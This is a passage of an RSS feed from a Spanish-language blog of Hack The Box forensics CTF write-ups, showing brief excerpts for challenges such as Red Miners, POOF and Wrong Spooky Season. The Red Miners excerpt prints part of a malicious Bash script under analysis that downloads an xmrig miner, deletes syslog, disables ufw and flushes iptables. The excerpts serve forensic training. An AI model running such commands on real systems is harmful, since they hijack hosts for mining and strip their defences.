El protocolo más sospechoso que se ha utilizado es Telnet, que es un protocolo que se emplea para conectarse a otra máquina. Sin embargo, no es seguro porque todo viaja en texto claro. Además, podemos ver que 46 paquetes estaban usando Telnet.</description></item><item><title>No Place To Hide</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/no-place-to-hide/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/no-place-to-hide/</guid><description>Se nos proporcionan estos archivos de log de una sesión RDP en Windows:
$ file Cache0000.bin Cache0000.bin: data $ file bcache24.bmc bcache24.bmc: empty $ du -h Cache0000.bin bcache24.bmc 17M	Cache0000.bin 0B	bcache24.bmc Y esta es la descripción del reto:
We found evidence of a password spray attack against the Domain Controller, and identified a suspicious RDP session. We&amp;rsquo;ll provide you with our RDP logs and other files. Can you see what they were up to?</description></item><item><title>Packet Cyclone</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/packet-cyclone/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/packet-cyclone/</guid><description>Tenemos esta descripción del reto:
Pandora&amp;rsquo;s friend and partner, Wade, is the one that leads the investigation into the relic&amp;rsquo;s location. Recently, he noticed some weird traffic coming from his host. That led him to believe that his host was compromised. After a quick investigation, his fear was confirmed. Pandora tries now to see if the attacker caused the suspicious traffic during the exfiltration phase. Pandora believes that the malicious actor used rclone to exfiltrate Wade&amp;rsquo;s research to the cloud.</description></item><item><title>Peel Back The Layers</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/peel-back-the-layers/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/peel-back-the-layers/</guid><description>Tenemos esta descripción del reto:
A well known hacker rival of ours, managed to gain access to our dockehub profile and insert a backdoor to one of our public docker images in order to distribute his malware and fullfil his soul purpose, which is to destroy our steampunk robot using his steam malware. When we started tracing him back he deleted his backdoor. Can you help us retrieve his backdoor? Docker Image: steammaintainer/gearrepairimage</description></item><item><title>POOF</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/poof/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/poof/</guid><description>Se nos proporcionan algunos archivos:
$ unzip -l POOF.zip Archive: POOF.zip Length Date Time Name ---------- ---------- ----- ---- 2567089 10-20-2022 11:12 candy_dungeon.pdf.boo 1096901984 10-20-2022 18:11 mem.dmp 7822474 10-20-2022 11:25 poof_capture.pcap 1126698 10-20-2022 12:04 Ubuntu_4.15.0-184-generic_profile.zip ---------- ------- 1108435601 4 files Y tenemos una instancia remota a la que conectarnos para responder a algunas preguntas:
$ nc 159.65.48.79 31240 +-------+-----------------------------------------------------+ | Title | Description | +-------+-----------------------------------------------------+ | POOF | In my company, we are developing a | | | new python game for Halloween.</description></item><item><title>Red Miners</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/red-miners/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/red-miners/</guid><description>Se nos proporciona el siguiente script en Bash:
#!/bin/bash checkTarget() { EXPECTED_USERNAME="root7654" EXPECTED_HOSTNAME_PREFIX="UNZ-" CURRENT_USERNAME=$(whoami) CURRENT_HOSTNAME=$(hostname) if [[ "$CURRENT_USERNAME" != "$EXPECTED_USERNAME" ]]; then exit 1 fi if [[ ! "$CURRENT_HOSTNAME" == "$EXPECTED_HOSTNAME_PREFIX"* ]]; then exit 1 fi } BIN_MD5="96cc922d3eb9ef23859377119332f8d7" BIN_DOWNLOAD_URL="http://tossacoin.htb/xmrig" BIN_DOWNLOAD_URL2="http://tossacoin.htb/xmrig" BIN_NAME="xmrig" cleanEnv() { ulimit -n 65535 rm -rf /var/log/syslog chattr -iua /tmp/ chattr -iua /var/tmp/ chattr -R -i /var/spool/cron chattr -i /etc/crontab ufw disable iptables -F echo "nope" &amp;gt;/tmp/log_rot sudo sysctl kernel.</description></item><item><title>Relic Maps</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/relic-maps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/relic-maps/</guid><description>Tenemos esta descripción para el reto:
Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows? Investigate the given attachment and figure out what&amp;rsquo;s going on and get the flag.</description></item><item><title>Scripts and Formulas</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/scripts-and-formulas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/scripts-and-formulas/</guid><description>Se nos proporcionan los siguientes archivos:
$ file * Invoice_01.lnk: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has command line arguments, Icon number=0, Archive, ctime=Tue May 30 18:44:18 2023, mtime=Tue Jul 4 11:46:42 2023, atime=Tue May 30 18:44:18 2023, length=492032, window=hidenormalshowminimized invoice.vbs: ASCII text, with very long lines (2360), with CRLF line terminators logs.zip: Zip archive data, at least v2.0 to extract, compression method=store El archivo logs.</description></item><item><title>Urgent</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/urgent/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/urgent/</guid><description>Se nos proporciona el siguiente archivo:
$ file Urgent\ Faction\ Recruitment\ Opportunity\ -\ Join\ Forces\ Against\ KORP™\ Tyranny.eml Urgent Faction Recruitment Opportunity - Join Forces Against KORP™ Tyranny.eml: ASCII text, with CRLF line terminators Este es un archivo de texto con extensión .eml, por lo que esperamos que sea un mensaje de correo electrónico:
X-Pm-Content-Encryption: end-to-end X-Pm-Origin: internal Subject: =?utf-8?Q?Urgent:_Faction_Recruitment_Opportunity_-_Join_Forces_Against_KORP=E2=84=A2_Tyranny!?= From: anonmember1337 &amp;lt;anonmember1337@protonmail.com&amp;gt; Date: Thu, 29 Feb 2024 12:52:17 +0000 Mime-Version: 1.</description></item><item><title>Valhalloween</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/valhalloween/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/valhalloween/</guid><description>Se nos proporcionan estos archivos:
$ tree Logs Logs ├── Application.evtx ├── DebugChannel.etl ├── HardwareEvents.evtx ├── Internet Explorer.evtx ├── Key Management Service.evtx ├── Microsoft-AppV-Client%4Admin.evtx ├── Microsoft-AppV-Client%4Operational.evtx ├── Microsoft-AppV-Client%4Virtual Applications.evtx ├── Microsoft-Client-License-Flexible-Platform%4Admin.evtx ├── Microsoft-Client-Licensing-Platform%4Admin.evtx ... ├── Microsoft-Windows-Workplace Join%4Admin.evtx ├── Microsoft-WindowsPhone-Connectivity-WiFiConnSvc-Channel.evtx ├── OAlerts.evtx ├── OpenSSH%4Admin.evtx ├── OpenSSH%4Operational.evtx ├── Parameters.evtx ├── SMSApi.evtx ├── Security.evtx ├── Setup.evtx ├── State.evtx ├── System.evtx └── Windows PowerShell.evtx 1 directory, 366 files Estos son archivos EVTX que representan logs de eventos de Windows.</description></item><item><title>Wrong Spooky Season</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/wrong-spooky-season/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/wrong-spooky-season/</guid><description>Se nos proporciona un archivo con una captura de tráfico de red llamado capture.pcap:
Análisis de tráfico Podemos usar Wireshark para analizarlo:
Mensajes HTTP Hay un montón de paquetes. Vamos a filtrar primero por HTTP:
Vale, ahora hay muchos menos paquetes para analizar.
Existen algunos mensajes HTTP que destacan al final. Podemos pensar que un usuario malintencionado está ejecutando comandos de sistema en el servidor de forma remota (cmd=whoami, cmd=id &amp;hellip;).</description></item></channel></rss>